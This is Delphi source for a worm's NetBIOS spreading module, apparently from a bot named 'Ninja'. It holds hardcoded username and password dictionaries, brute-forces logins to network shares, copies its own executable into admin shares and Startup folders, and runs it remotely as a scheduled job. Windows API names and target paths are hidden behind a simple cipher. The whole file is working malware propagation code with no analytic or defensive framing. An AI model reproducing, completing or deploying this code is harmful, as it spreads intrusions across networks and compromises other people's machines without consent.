unit untNetbios;

interface

uses
  windows,
  wininet,
  untFunctions,
  untCrypt,
  untGlobalDeclare;

  {$I Ninja.ini}

const
  {
  netbios_max_password = 2;
  netbios_password: array[0..netbios_max_password] of string = (
  '',
  'root',
  'password');

  netbios_max_username = 3;
  netbios_username: array[0..netbios_max_username] of string = (
  'Guest',
  'Administrator',
  'Owner',
  'Root');
  }

      NETBIOS_MAX_PASSWORD = 101;
      NETBIOS_PASSWORD: ARRAY [0..NETBIOS_MAX_PASSWORD] OF STRING = (
      '','1234','password','6969','harley','123456','golf','pussy','mustang',
      '1111','shadow','1313','fish','5150','7777','qwerty','baseball','2112',
      'letmein','12345678','12345','ccc','admin','Admin','Password','1','12',
      '123','1234567','123456789','654321','54321','111','000000','abc','pw',
      '11111111','88888888','pass','passwd','database','abcd','abc123','pass',
      'sybase','123qwe','server','computer','Internet','super','123asd','0',
      'ihavenopass','godblessyou','enable','xp','2002','2003','2600','alpha',
      '110','111111','121212','123123','1234qwer','123abc','007','a','aaa',
      'patrick','pat','administrator','root','sex','god','foobar','secret',
      'abc','test','test123','temp','temp123','win','pc','asdf','oracle''pwd',
      'qwer','yxcv','zxcv','home','xxx','owner','login','Login','pw123',
      'love','mypc','mypc123','admin123','mypass','mypass123','901100');

      NETBIOS_MAX_USERNAME = 6;
      NETBIOS_USERNAME: ARRAY [0..NETBIOS_MAX_USERNAME] OF STRING = (
      'Guest', 'Administrator', 'Owner', 'Root',
      'Administratör', 'Admin', '');

SharePath     :Array[0..9] Of String = ('Admin$\system32', 'c$\winnt\system32', 'c$\windows\system32', 'c', 'd',
                                        'e', 'f', 'c$\documents and settings\all users\start menu\programs\startup\',
                                        'c$\windows\start menu\programs\startup\',
                                        'c$\winnt\profiles\all users\start menu\programs\startup\');
(*

'c$\documents and settings\all users\start menu\programs\startup\',
'c$\windows\start menu\programs\startup\',
'c$\winnt\profiles\all users\start menu\programs\startup\'

187=\documents and settings\all users\start menu\programs\startup\,
188=\windows\start menu\programs\startup\,
189=\winnt\profiles\all users\start menu\programs\startup\,
*)

usernames:array[0..19] of string=(
	'administrator',	'administrador',	'administrateur',
	'administrat',	'admins',	'admin',	'staff',
	'root',	'computer',	'owner',	'student',	'teacher',
	'wwwadmin',	'guest',	'default',	'database',
	'dba',	'oracle',	'db2',	'');

passwords:array[0..139] of string=(
	'',	'administrator',	'administrador',	'administrateur',
	'administrat',	'admins',	'admin',	'adm',	'password1',
	'password',	'passwd',	'pass1234',	'pass',	'pwd',
	'007',	'1',	'12',	'123',	'1234',	'12345',	'123456',
        '1234567',	'12345678',	'123456789',	'1234567890',	'2000',
	'2001',	'2002',	'2003',	'2004',	'test',	'guest',	'none',	'demo',
	'unix',	'linux',	'changeme',	'default',	'system',	'server',
	'root',	'null',	'qwerty',	'mail',	'outlook',	'web',	'www',
	'internet',	'accounts',	'accounting',	'home',	'homeuser',
	'user',	'oem',	'oemuser',	'oeminstall',	'windows',	'win98',
	'win2k',	'winxp',	'winnt',	'win2000',	'qaz',
	'asd',	'zxc',	'qwe',	'bob',	'jen',	'joe',	'fred',	'bill',	'mike',
	'john',	'peter',	'luke',	'sam',	'sue',	'susan',	'peter',
	'brian',	'lee',	'neil',	'ian',	'chris',	'eric',	'george',
	'kate',	'bob',	'katie',	'mary',	'login',	'loginpass',
	'technical',	'backup',	'exchange',	'fuck',	'bitch',
	'slut',	'sex',	'god',	'hell',	'hello',	'domain',	'domainpass',
	'domainpassword',	'database',	'access',	'dbpass',
	'dbpassword',	'databasepass',	'data',	'databasepassword',	'db1',
	'db2',	'db1234',	'sa',	'sql',	'sqlpass',	'oainstall',
	'orainstall',	'oracle',	'ibm',	'cisco',	'dell',
	'compaq',	'siemens',	'hp',	'nokia',	'xp',
	'control',	'office',	'blank',	'winpass',
	'main',	'lan',	'internet',	'intranet',	'student',	'teacher',
	'staff');

  netbios_pathsize = 4;
  netbios_path: array[1..netbios_pathsize] of string = (
  'tjmgltppWBQW'#3'nFMVsQLDQBNPpWBQWVS',
  '',
  'tjmmwsQLEJOFPbOO'#3'vPFQPpWBQW'#3'nFMVsQLDQBNPpWBQWVS',
  'gL@VNFMWP'#3'BMG'#3'pFWWJMDPbOO'#3'vPFQPpWBQW'#3'nFMVsQLDQBNPpWBQWVS');

var
  lpNetApiBufferFree  : FUNCTION(Buffer:Pointer) : DWORD;STDCALL;
  lpNetRemoteTOD      : FUNCTION(UNCServerName:pChar;BufferPtr:pByte) : DWORD;STDCALL;
  lpNetScheduleJobAdd : FUNCTION(ServerName:pChar;Buffer:pByte;VAR JobID:DWORD) : DWORD;STDCALL;
  OLD_NetShareEnum    : FUNCTION(pszServer:pChar;sLevel:SmallInt;VAR Bufptr;cbBuffer:Cardinal;VAR pcEntriesRead,pcTotalAvail:Cardinal) : DWORD; STDCALL;
  NT_NetShareEnum     : FUNCTION(ServerName:pWideChar;Level:DWORD;VAR Bufptr;Prefmaxlen:DWORD;VAR EntriesRead,TotalEntries,resume_handle:DWORD) : DWORD; STDCALL;

  function netbios_directoryexists(const dir: string): boolean;
  procedure netbios_netremoteexecute(location, remoteaddr: string);
  function netbios_infectsharedresource(remoteaddr, remotename: string): boolean;
  function netbios_enumshare(remoteaddr: string): boolean;
  procedure initnetapifunctions;

implementation

function netbios_directoryexists(const dir: string): boolean;
var
  attr  :dword;
begin
  attr := getfileattributes(pchar(dir));
  result := (attr<>$FFFFFFFF) and (attr and file_attribute_directory=file_attribute_directory);
end;

procedure netbios_netremoteexecute(location, remoteaddr: string);
type
  ptime_of_day_info = ^ttime_of_day_info;
  ttime_of_day_info = record
    tod_elapsedt    : DWORD;
    tod_msecs       : DWORD;
    tod_hours       : DWORD;
    tod_mins        : DWORD;
    tod_secs        : DWORD;
    tod_hunds       : DWORD;
    tod_timezone    : LongInt;
    tod_tinterval   : DWORD;
    tod_day         : DWORD;
    tod_month       : DWORD;
    tod_year        : DWORD;
    tod_weekday     : DWORD;
  end;
  at_info = record
    jobtime     :dword;
    daysofmonth :dword;
    daysofweek  :uchar;
    flags       :uchar;
    command     :pwidechar;
  end;
var
  jobid         :dword;
  remotetime    :dword;
  return        :dword;
  netat         :at_info;
  cmd           :pwidechar;
  server        :pwidechar;
  nettod        :ptime_of_day_info;
begin
  getmem(cmd, 1024+1);
  getmem(server, 256+1);
  nettod := nil;
  stringtowidechar(remoteaddr, server, 256);
  stringtowidechar(location, cmd, 1024);
  return := lpnetremotetod(pchar(remoteaddr), @nettod);
  if return = 0 then
  begin
    remotetime := (nettod.tod_hours*3600+nettod.tod_mins*60+nettod.tod_secs)*1000+nettod.tod_hunds*10;
    if nettod.tod_timezone <> -1 then remotetime := remotetime - nettod.tod_timezone * 60000;
    remotetime := remotetime + 3000;
    if netbios_isntbased then lpnetapibufferfree(nettod);
    zeromemory(@netat, sizeof(netat));
    netat.jobtime := remotetime;
    netat.command := cmd;
    lpnetschedulejobadd(pchar(server), @netat, jobid);
  end;
  freemem(cmd);
  freemem(server);
end;

function netbios_infectsharedresource(remoteaddr, remotename: string): boolean;
var
  maxusername   :word;
  maxpassword   :word;
  i             :dword;
  ret           :dword;
  fullpath      :string;
  k             :integer;
  l             :integer;
  n             :integer;
  netresource   :tnetresource;
begin
  result := false;

  remotename := remoteaddr + '\' + remotename;
  netresource.dwType := resourcetype_disk;
  netresource.lpLocalName := nil;
  netresource.lpRemoteName := pchar(remotename);
  netresource.lpProvider := nil;

  getmodulefilename(getmodulehandle(nil), pchar(fullpath), length(fullpath));

  if netbios_isntbased then
  begin
    maxusername := netbios_max_username;
    maxpassword := netbios_max_password;
  end else
  begin
    maxusername := 0;
    maxpassword := 0;
  end;

  for k := 0 to sizeof(usernames)-1 do
    for l := 0 to sizeof(passwords)-1 do
    begin
      ret := wnetaddconnection2(netresource, pchar(passwords[l]), pchar(usernames[k]), 0);
      for i := 0 to sizeof(SharePath)-1 do
        if netbios_directoryexists(netresource.lpRemoteName + sharepath[i]) then
          if copyfile(pchar(paramstr(0)), pchar(remotename + sharepath[i] + '\ninja.exe'), false) then
            if netbios_isntbased then
            begin
              netbios_netremoteexecute(remotename + sharepath[i] + '\ninja.exe', remoteaddr);
              result := true;
            end;
      for n := 0 to 20 do
        if wnetcancelconnection(netresource.lpRemoteName, true) = no_error then break;            
    end;

  for k := 0 to maxusername do
    for l := 0 to maxpassword do
    begin
      ret := wnetaddconnection2(netresource, pchar(NETBIOS_PASSWORD[l]), pchar(NETBIOS_USERNAME[k]), 0);
      for i := 1 to netbios_pathsize do
        if netbios_directoryexists(netresource.lpRemoteName + crypt(netbios_path[i], 35)) then
          if copyfile(pchar(paramstr(0)), pchar(remotename + crypt(netbios_path[i], 35) + 'ninja.exe'), false) then
          begin
            if netbios_isntbased then netbios_netremoteexecute(remotename+crypt(netbios_path[i], 35)+'ninja.exe', remoteaddr);
            result := true;
          end;

      for n := 0 to 20 do
        if wnetcancelconnection(netresource.lpRemoteName, true) = no_error then break;
    end;

end;

function netbios_enumshare(remoteaddr: string): boolean;
type
  share_info_1 = record
    shi1_netname        :pwidechar;
    shi1_type           :dword;
    shi1_remark         :lptstr;
  end;
  lpshare_info_1 = ^share_info_1;
var
  k             :dword;
  resume        :dword;
  return        :dword;
  readentires   :dword;
  totalentires  :dword;
  sharename     :string;
  wcremoteaddr  :pwidechar;
  lpshareinfo   :lpshare_info_1;
  lpcurrentinfo :lpshare_info_1;
begin
  result := false;
  getmem(wcremoteaddr, max_path);
  stringtowidechar(remoteaddr, wcremoteaddr, max_path);
  resume := 0;
  repeat
    lpshareinfo := nil;
    if netbios_isntbased then
      return := nt_netshareenum(wcremoteaddr, 1, lpshareinfo, 8192, readentires, totalentires, resume)
    else
      return := old_netshareenum(pchar(wcremoteaddr), 1, lpshareinfo, 8192, readentires, totalentires);
    if (return <> error_more_data) and (return <> error_success) then break;
    lpcurrentinfo := lpshareinfo;
    for k := 0 to readentires-1 do
    begin
      sharename := lpcurrentinfo.shi1_netname;
      if lpcurrentinfo.shi1_type <> 1 then result := netbios_infectsharedresource(remoteaddr, sharename);
      inc(lpcurrentinfo);
    end;
    if netbios_isntbased then
      lpnetapibufferfree(lpshareinfo);
  until return <> error_more_data;
  freemem(wcremoteaddr);
end;

procedure initnetapifunctions;
var
  netapi32 :thandle;
begin
  netapi32 := loadlibrary(pchar(crypt('MFWBSJ', 35)));
  lpnetremotetod := getprocaddress(netapi32, pchar(crypt('mFWqFNLWFwlg', 35)));
  lpnetschedulejobadd := getprocaddress(netapi32, pchar(crypt('mFWp@KFGVOFiLAbGG', 35)));
  if netbios_isntbased then
  begin
    nt_netshareenum := getprocaddress(netapi32, pchar(crypt('mFWpKBQFfMVN', 35)));
    lpnetapibufferfree := getprocaddress(netapi32, pchar(crypt('mFWbSJaVEEFQeQFF', 35)));
  end else
    old_netshareenum := getprocaddress(netapi32, pchar(crypt('mFWpKBQFfMVN', 35)));
end;

end.
